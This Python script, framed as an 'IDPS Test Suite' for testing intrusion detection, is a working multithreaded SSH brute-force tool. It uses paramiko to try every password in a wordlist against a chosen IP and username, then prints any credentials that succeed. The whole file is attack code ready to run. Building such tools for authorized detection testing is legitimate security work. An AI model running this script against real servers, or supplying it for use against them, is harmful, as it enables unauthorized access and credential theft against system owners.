import paramiko
import os
from concurrent.futures import ThreadPoolExecutor
from threading import Event
import sys

# Event object to stop all threads once the correct password is found
stop_event = Event()

def attempt(ip, username, pwd):
    """
    Attempts to establish an SSH connection with a given credential set.

    :param ip: The target IP address of the SSH server.
    :param username: The username to authenticate with.
    :param pwd: The password to test.
    :return: None
    """
    if stop_event.is_set():
        return

    # Initialize SSH client
    client = paramiko.SSHClient()
    # Add the server's host key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Attempt connection
        client.connect(hostname=ip, username=username, password=pwd.strip(), timeout=3, allow_agent=False, look_for_keys=False)

    except paramiko.ssh_exception.AuthenticationException:
        # Wrong password - expected behavior during brute force
        pass

    except paramiko.ssh_exception.NoValidConnectionsError:
        print(f"[!] Connection failed to {ip}")
        stop_event.set() # Stop the test if the host is unreachable

    except Exception as e:
        # Handle other potential network issues
        pass

    else:
        # If no exception was raised, the password is correct
        print(f"\nSuccess! Credentials found! User: {username}, Password: {pwd.strip()}")
        stop_event.set()

    finally:
        client.close()

def main():
    """
    Main entry point for the SSH Brute Force simulation.
    Orchestrates a multithreaded attack to test IDS detection capabilities.
    """

    print("IDPS Test Suite: SSH Brute Force Testing")
    target_ip = input("Target IP [192.168.1.1]: ").strip() or "192.168.1.1"
    target_username = input("Target Username [kali]: ").strip() or "kali"
    passwords_file = input("Passwords file path [ssh_passwords.txt]: ").strip() or "ssh_passwords.txt"

    if not os.path.exists(passwords_file):
        print(f"[!] Error: File '{passwords_file}' not found.")
        return

    print(f"Starting SSH Brute Force on {target_ip} as '{target_username}'...")

    try:
        with open(passwords_file, 'r') as passwords:
            with ThreadPoolExecutor(max_workers=10) as executor:
                for pwd in passwords:
                    if stop_event.is_set():
                        break
                    
                    # Submit the attempt to the thread pool
                    executor.submit(attempt, target_ip, target_username, pwd)
                    
    except KeyboardInterrupt:
        print("\n[!] Aborting simulation...")
        stop_event.set()

if __name__ == "__main__":
    main()
    